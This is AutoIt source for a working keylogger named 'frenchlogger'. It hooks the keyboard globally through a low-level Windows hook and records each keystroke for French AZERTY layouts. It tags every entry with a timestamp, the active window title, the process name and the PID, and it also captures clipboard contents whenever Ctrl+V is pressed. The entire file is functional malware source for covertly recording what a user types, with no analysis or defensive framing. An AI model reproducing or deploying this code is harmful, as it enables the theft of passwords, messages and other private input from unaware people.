#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=frenchlogger86.exe
#AutoIt3Wrapper_Outfile_x64=frenchlogger64.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_Change2CUI=y
#AutoIt3Wrapper_AU3Check_Stop_OnWarning=y
#AutoIt3Wrapper_AU3Check_Parameters=-w 1 -w 2 -w 3 -w 4
#AutoIt3Wrapper_Run_Tidy=y
#Tidy_Parameters=/rel
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Misc.au3>
#include <Process.au3>
#include <WinAPI.au3>
#include <WindowsConstants.au3>
#include <WinAPIProc.au3>
#include <Timers.au3>
If @KBLayout <> "0000040C" Then Exit
Opt("TrayAutoPause", 0)
Opt("TrayMenuMode", 2)
Global $hHook, $hStub_KeyProc, $title = "", $title_1 = ""
Global $STORED
$hStub_KeyProc = DllCallbackRegister("_KeyProc", "long", "int;wparam;lparam")
$hmod = _WinAPI_GetModuleHandle(0)
$hHook = _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($hStub_KeyProc), $hmod)
OnAutoItExitRegister("OnAutoItExit")
While 1
	Sleep(10)
WEnd
Func _KeyProc($nCode, $wParam, $lParam)
	Local $tKEYHOOKS
	Local $vKode, $iFlags
	$tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
	If $nCode > -1 Then
		Switch $wParam
			Case $WM_KEYDOWN, $WM_SYSKEYDOWN
				$tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
				$vKode = DllStructGetData($tKEYHOOKS, "vkCode")
				$iFlags = DllStructGetData($tKEYHOOKS, "flags")

				If $vKode = 0x08 Then ;DEL
					_KEY_Send('{DEL}')
				ElseIf $vKode = 0x2E Then ;DEL
					_KEY_Send('{SUPPR}')
				ElseIf $vKode = 0x09 Then ;TAB
					_KEY_Send('{TAB}')
;~ 				ElseIf $vKode = 0x0C Then ;CLEAR
;~ 					_KEY_Send('{CLEAR}')
				ElseIf $vKode = 0x0D Then ;ENTER
					_KEY_Send('{ENTER}')
;~ 				ElseIf $vKode = 0x11 Then ;CTRL
;~ 					_KEY_Send('{CTRL}')
;~ 				ElseIf $vKode = 0x12 Then ;ALT
;~ 					_KEY_Send('{ALT}')
;~ 				ElseIf $vKode = 0x13 Then ;PAUSE
;~ 					_KEY_Send('{PAUSE}')
;~ 				ElseIf $vKode = 0x14 Then ;CAPSLOCK
;~ 					_KEY_Send('{CAPSLOCK}')
;~ 				ElseIf $vKode = 0x1B Then ;ESC
;~ 					_KEY_Send('{ESC}')
				ElseIf $vKode = 0x20 Then ;SPACE
					_KEY_Send('{SPACE}')
;~ 				ElseIf $vKode = 0x21 Then ;PAGE UP
;~ 					_KEY_Send('{PAGE UP}')
;~ 				ElseIf $vKode = 0x22 Then ;PAGE DOWN
;~ 					_KEY_Send('{PAGE DOWN}')
;~ 				ElseIf $vKode = 0x23 Then ;END
;~ 					_KEY_Send('{END}')
;~ 				ElseIf $vKode = 0x24 Then ;HOME
;~ 					_KEY_Send('{HOME}')
				ElseIf $vKode = 0x25 Then ;ARROW LEFT
					_KEY_Send('{ARROW LEFT}')
				ElseIf $vKode = 0x26 Then ;ARROW UP
					_KEY_Send('{ARROW UP}')
				ElseIf $vKode = 0x27 Then ;ARROW RIGHT
					_KEY_Send('{ARROW RIGHT}')
				ElseIf $vKode = 0x28 Then ;ARROW DOWN
					_KEY_Send('{ARROW DOWN}')
;~ 				ElseIf $vKode = 0x29 Then ;SELECT
;~ 					_KEY_Send('{SELECT}')
;~ 				ElseIf $vKode = 0x2A Then ;PRINT
;~ 					_KEY_Send('{PRINT}')
;~ 				ElseIf $vKode = 0x2B Then ;EXECUTE
;~ 					_KEY_Send('{EXECUTE}')
;~ 				ElseIf $vKode = 0x2C Then ;PRINT SREEN
;~ 					_KEY_Send('{PRINT SCREEN}')
;~ 				ElseIf $vKode = 0x2D Then ;INSERT
;~ 					_KEY_Send('{INSERT}')
;~ 				ElseIf $vKode = 0x2F Then ;HELP
;~ 					_KEY_Send('{HELP}')
				ElseIf $vKode = 0x5B Then ;WIN LEFT
					_KEY_Send('{WIN LEFT}')
				ElseIf $vKode = 0x5C Then ;WIN RIGHT
					_KEY_Send('{WIN RIGHT}')
;~ 				ElseIf $vKode = 0x5D Then ;APPS
;~ 					_KEY_Send('APPS')
;~ 				ElseIf $vKode = 0x5F Then ;SLEEP
;~ 					_KEY_Send('SLEEP')
				ElseIf $vKode = 0x6A Then ;MULTIPLY
					_KEY_Send('*')
				ElseIf $vKode = 0x6B Then ;ADD
					_KEY_Send('+')
				ElseIf $vKode = 0x6C Then ;SEPARATOR
					_KEY_Send('-')
				ElseIf $vKode = 0x6D Then ;DECIMAL
					_KEY_Send('.')
				ElseIf $vKode = 0x6E Then ;DECIMAL
					_KEY_Send('.')
				ElseIf $vKode = 0x6F Then ;DIVIDE
					_KEY_Send('/')
				ElseIf $vKode = 0x90 Then ;NUMLOCK
					_KEY_Send('{NUMLOCK}')
;~ 				ElseIf $vKode = 0x91 Then ;SCROLL LOCK
;~ 					_KEY_Send('{SCROLL LOCK}')
;~ 				ElseIf $vKode = 0xA0 Then ;SHIFT LEFT
;~ 					_KEY_Send('{SHIFT LEFT}')
;~ 				ElseIf $vKode = 0xA1 Then ;SHIFT RIGHT
;~ 					_KEY_Send('{SHIFT RIGHT}')
;~ 				ElseIf $vKode = 0xA2 Then ;CTRL LEFT
;~ 					_KEY_Send('{CTRL LEFT}')
;~ 				ElseIf $vKode = 0xA3 Then ;CTRL RIGHT
;~ 					_KEY_Send('{CTRL RIGHT}')
;~ 				ElseIf $vKode = 0xA4 Then ;ALT LEFT
;~ 					_KEY_Send('{ALT LEFT}')
;~ 				ElseIf $vKode = 0xA5 Then ;ALT RIGHT
;~ 					_KEY_Send('{ALT RIGHT}')
				ElseIf $vKode = 0x60 Then ;NUMPAD0
					_KEY_Send('0')
				ElseIf $vKode = 0x61 Then ;NUMPAD1
					_KEY_Send('1')
				ElseIf $vKode = 0x62 Then ;NUMPAD2
					_KEY_Send('2')
				ElseIf $vKode = 0x63 Then ;NUMPAD3
					_KEY_Send('3')
				ElseIf $vKode = 0x64 Then ;NUMPAD4
					_KEY_Send('4')
				ElseIf $vKode = 0x65 Then ;NUMPAD5
					_KEY_Send('5')
				ElseIf $vKode = 0x66 Then ;NUMPAD6
					_KEY_Send('6')
				ElseIf $vKode = 0x67 Then ;NUMPAD7
					_KEY_Send('7')
				ElseIf $vKode = 0x68 Then ;NUMPAD8
					_KEY_Send('8')
				ElseIf $vKode = 0x69 Then ;NUMPAD9
					_KEY_Send('9')
				ElseIf $vKode = 0x70 Then ;F1
					_KEY_Send('{F1}')
				ElseIf $vKode = 0x71 Then ;F2
					_KEY_Send('{F2}')
				ElseIf $vKode = 0x72 Then ;F3
					_KEY_Send('{F3}')
				ElseIf $vKode = 0x73 Then ;F4
					_KEY_Send('{F4}')
				ElseIf $vKode = 0x74 Then ;F5
					_KEY_Send('{F5}')
				ElseIf $vKode = 0x75 Then ;F6
					_KEY_Send('{F6}')
				ElseIf $vKode = 0x76 Then ;F7
					_KEY_Send('{F7}')
				ElseIf $vKode = 0x77 Then ;F8
					_KEY_Send('{F8}')
				ElseIf $vKode = 0x78 Then ;F9
					_KEY_Send('{F9}')
				ElseIf $vKode = 0x79 Then ;F10
					_KEY_Send('{F10}')
				ElseIf $vKode = 0x7A Then ;F11
					_KEY_Send('{F11}')
				ElseIf $vKode = 0x7B Then ;F12
					_KEY_Send('{F12}')
				ElseIf $vKode = 0x30 Then ;0
					If _KEY_STATE() = 1 Then
						_KEY_Send('à')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('0')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('@')
					EndIf
				ElseIf $vKode = 0x31 Then ;1
					If _KEY_STATE() = 1 Then
						_KEY_Send('&')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('1')
					EndIf
				ElseIf $vKode = 0x32 Then ;2
					If _KEY_STATE() = 1 Then
						_KEY_Send('é')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('2')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('~')
					EndIf
				ElseIf $vKode = 0x33 Then ;3
					If _KEY_STATE() = 1 Then
						_KEY_Send('"')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('3')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('#')
					EndIf
				ElseIf $vKode = 0x34 Then ;4
					If _KEY_STATE() = 1 Then
						_KEY_Send("'")
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('4')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('{')
					EndIf
				ElseIf $vKode = 0x35 Then ;5
					If _KEY_STATE() = 1 Then
						_KEY_Send('(')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('5')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('[')
					EndIf
				ElseIf $vKode = 0x36 Then ;6
					If _KEY_STATE() = 1 Then
						_KEY_Send('-')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('6')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('|')
					EndIf
				ElseIf $vKode = 0x37 Then ;7
					If _KEY_STATE() = 1 Then
						_KEY_Send('è')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('7')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('`')
					EndIf
				ElseIf $vKode = 0x38 Then ;8
					If _KEY_STATE() = 1 Then
						_KEY_Send('_')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('8')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('\')
					EndIf
				ElseIf $vKode = 0x39 Then ;9
					If _KEY_STATE() = 1 Then
						_KEY_Send('ç')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('9')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('^')
					EndIf
				ElseIf $vKode = 0x41 Then ;A
					If _KEY_STATE() = 1 Then
						_KEY_Send('a')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('A')
					ElseIf _KEY_STATE() = 4 Then
						_KEY_Send('{CTRL+A}')
					EndIf
				ElseIf $vKode = 0x42 Then ;B
					If _KEY_STATE() = 1 Then
						_KEY_Send('b')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('B')
					EndIf
				ElseIf $vKode = 0x43 Then     ;C
					If _KEY_STATE() = 1 Then
						_KEY_Send('c')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('C')
					ElseIf _KEY_STATE() = 4 Then
						_KEY_Send('{CTRL+C}')
					EndIf
				ElseIf $vKode = 0x44 Then     ;D
					If _KEY_STATE() = 1 Then
						_KEY_Send('d')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('D')
					EndIf
				ElseIf $vKode = 0x45 Then     ;E
					If _KEY_STATE() = 1 Then
						_KEY_Send('e')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('E')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('€')
					EndIf
				ElseIf $vKode = 0x46 Then     ;F
					If _KEY_STATE() = 1 Then
						_KEY_Send('f')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('F')
					EndIf
				ElseIf $vKode = 0x47 Then     ;G
					If _KEY_STATE() = 1 Then
						_KEY_Send('g')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('G')
					EndIf
				ElseIf $vKode = 0x48 Then     ;H
					If _KEY_STATE() = 1 Then
						_KEY_Send('h')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('H')
					EndIf
				ElseIf $vKode = 0x49 Then     ;I
					If _KEY_STATE() = 1 Then
						_KEY_Send('i')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('I')
					EndIf
				ElseIf $vKode = 0x4A Then     ;J
					If _KEY_STATE() = 1 Then
						_KEY_Send('j')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('J')
					EndIf
				ElseIf $vKode = 0x4B Then     ;K
					If _KEY_STATE() = 1 Then
						_KEY_Send('k')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('K')
					EndIf
				ElseIf $vKode = 0x4C Then     ;L
					If _KEY_STATE() = 1 Then
						_KEY_Send('l')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('L')
					EndIf
				ElseIf $vKode = 0x4D Then     ;M
					If _KEY_STATE() = 1 Then
						_KEY_Send('m')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('M')
					EndIf
				ElseIf $vKode = 0x4E Then     ;N
					If _KEY_STATE() = 1 Then
						_KEY_Send('n')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('N')
					EndIf
				ElseIf $vKode = 0x4F Then     ;O
					If _KEY_STATE() = 1 Then
						_KEY_Send('o')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('O')
					EndIf
				ElseIf $vKode = 0x50 Then     ;P
					If _KEY_STATE() = 1 Then
						_KEY_Send('p')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('P')
					EndIf
				ElseIf $vKode = 0x51 Then     ;Q
					If _KEY_STATE() = 1 Then
						_KEY_Send('q')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('Q')
					EndIf
				ElseIf $vKode = 0x52 Then     ;R
					If _KEY_STATE() = 1 Then
						_KEY_Send('r')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('R')
					EndIf
				ElseIf $vKode = 0x53 Then     ;S
					If _KEY_STATE() = 1 Then
						_KEY_Send('s')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('S')
					EndIf
				ElseIf $vKode = 0x54 Then     ;T
					If _KEY_STATE() = 1 Then
						_KEY_Send('t')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('T')
					EndIf
				ElseIf $vKode = 0x55 Then     ;U
					If _KEY_STATE() = 1 Then
						_KEY_Send('u')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('U')
					EndIf
				ElseIf $vKode = 0x56 Then     ;V
					If _KEY_STATE() = 1 Then
						_KEY_Send('v')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('V')
					ElseIf _KEY_STATE() = 4 Then
						If IsString(ClipGet()) Then
							_KEY_Send("-----" & ClipGet() & "-----")
						EndIf
					EndIf
				ElseIf $vKode = 0x57 Then     ;W
					If _KEY_STATE() = 1 Then
						_KEY_Send('w')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('W')
					EndIf
				ElseIf $vKode = 0x58 Then     ;X
					If _KEY_STATE() = 1 Then
						_KEY_Send('x')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('X')
					ElseIf _KEY_STATE() = 4 Then
						_KEY_Send('{CTRL+X}')
					EndIf
				ElseIf $vKode = 0x59 Then     ;Y
					If _KEY_STATE() = 1 Then
						_KEY_Send('y')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('Y')
					EndIf
				ElseIf $vKode = 0x5A Then     ;Z
					If _KEY_STATE() = 1 Then
						_KEY_Send('z')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('Z')
					EndIf
				ElseIf $vKode = 0xBA Then ;OEMBA
					If _KEY_STATE() = 1 Then
						_KEY_Send('$')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('£')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('¤')
					EndIf
				ElseIf $vKode = 0xBB Then ;OEMBB
					If _KEY_STATE() = 1 Then
						_KEY_Send('=')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('+')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send('}')
					EndIf
				ElseIf $vKode = 0xBC Then ;OEMBC
					If _KEY_STATE() = 1 Then
						_KEY_Send(',')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('?')
					EndIf
				ElseIf $vKode = 0xBE Then ;OEMBE
					If _KEY_STATE() = 1 Then
						_KEY_Send(';')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('.')
					EndIf
				ElseIf $vKode = 0xBF Then ;OEMBF
					If _KEY_STATE() = 1 Then
						_KEY_Send(':')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('/')
					EndIf
				ElseIf $vKode = 0xC0 Then ;OEMC0
					If _KEY_STATE() = 1 Then
						_KEY_Send('ù')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('%')
					EndIf
				ElseIf $vKode = 0xDB Then ;OEMDB
					If _KEY_STATE() = 1 Then
						_KEY_Send(')')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('°')
					ElseIf _KEY_STATE() = 3 Then
						_KEY_Send(']')
					EndIf
				ElseIf $vKode = 0xDC Then ;OEMDC
					If _KEY_STATE() = 1 Then
						_KEY_Send('*')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('µ')
					EndIf
				ElseIf $vKode = 0xDE Then ;OEMDE
					_KEY_Send('²')
				ElseIf $vKode = 0xDD Then ;OEMDD
					If _KEY_STATE() = 1 Then
						_KEY_Send('^')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('¨')
					EndIf
				ElseIf $vKode = 0xDF Then ;OEMDF
					If _KEY_STATE() = 1 Then
						_KEY_Send('!')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('§')
					EndIf
				ElseIf $vKode = 0xE2 Then ;OEME2
					If _KEY_STATE() = 1 Then
						_KEY_Send('<')
					ElseIf _KEY_STATE() = 2 Then
						_KEY_Send('>')
					EndIf
;~ 				ElseIf $vKode = 0xBD Then ;OEMBD
;~ 					_KEY_Send('{OEMBD}')
;~ 				ElseIf $vKode = 0xE1 Then     ;OEME1
;~ 					_KEY_Send('{OEME1}')
;~ 				ElseIf $vKode = 0xE3 Then     ;OEME3
;~ 					_KEY_Send('{OEME3}')
;~ 				ElseIf $vKode = 0xE4 Then     ;OEME4
;~ 					_KEY_Send('{OEME4}')
;~ 				ElseIf $vKode = 0xE5 Then     ;OEME5
;~ 					_KEY_Send('{OEME5}')
;~ 				ElseIf $vKode = 0xE6 Then ;OEME6
;~ 					_KEY_Send('{OEME6}')
;~ 				ElseIf $vKode = 0xE9 Then ;OEME9
;~ 					_KEY_Send('{OEME9}')
;~ 				ElseIf $vKode = 0xF5 Then ;OEMF5
;~ 					_KEY_Send('{OEMF5}')
				EndIf
		EndSwitch
	EndIf
	Return _WinAPI_CallNextHookEx($hHook, $nCode, $wParam, $lParam)

EndFunc   ;==>_KeyProc

Func _KEY_Send($sKEY)
	Local $title = WinGetTitle("")
	Local $iPid = WinGetProcess($title, "")
	Local $Proc = _ProcessGetName($iPid)
	If $title_1 <> $title Then
		$title_1 = $title
		Local $oDate = "(" & @YEAR & "-" & @MON & "-" & @MDAY & "-" & @HOUR & ":" & @MIN & ":" & @SEC & ")"
		Local $oProc = "[" & $Proc & "]"
		Local $oPiD = "|" & $iPid & "|"
		Local $oTitle = "{" & $title_1 & "}"
		If $oProc == "[]" Then $oProc = "[" & "?????" & "]"
		If $oPiD == "||" Or $oPiD == "|-1|" Then $oPiD = "|" & "????" & "|"
		If $oTitle == "{}" Then $oTitle = "{" & "?????" & "}"
		If $STORED <> "" Then
			ConsoleWrite($STORED & @CRLF)
			$STORED = ""
		EndIf
		$STORED = $oDate & $oProc & $oTitle & $sKEY
	Else
		$STORED = $STORED & $sKEY
	EndIf

EndFunc   ;==>_KEY_Send

Func _KEY_STATE()
	Local $fCaps
	$fCaps = DllCall("user32.dll", "long", "GetKeyState", "long", 0x14)
	If $fCaps[0] = 0 Then
		$fCaps = False
	Else
		$fCaps = True
	EndIf
	Local $fShift = _IsPressed('10')
	Local $fCtrl = _IsPressed('11')
	Local $fAlt = _IsPressed('12')

	If $fShift = False And $fCtrl = False And $fAlt = False And $fCaps = False Then
		Return 1
		;1 = NO MAJ
	ElseIf $fCaps = True And $fShift = True And $fAlt = False And $fCtrl = False Then
		Return 1
		;2 = MAJ
	ElseIf $fCaps = True And $fShift = False And $fAlt = False And $fCtrl = False Then ;CAPS
		Return 2
	ElseIf $fCaps = False And $fShift = True And $fAlt = False And $fCtrl = False Then
		Return 2
		;3 = ALT
	ElseIf $fAlt = True And $fShift = False Then
		Return 3
	ElseIf $fCtrl = True Then
		;4 = CTRL
		Return 4
	Else
		;0 = NOTHING
		Return 0
	EndIf
EndFunc   ;==>_KEY_STATE

Func OnAutoItExit()
	_WinAPI_UnhookWindowsHookEx($hHook)
	DllCallbackFree($hStub_KeyProc)
EndFunc   ;==>OnAutoItExit

Func _Exit()
	Exit
EndFunc   ;==>_Exit
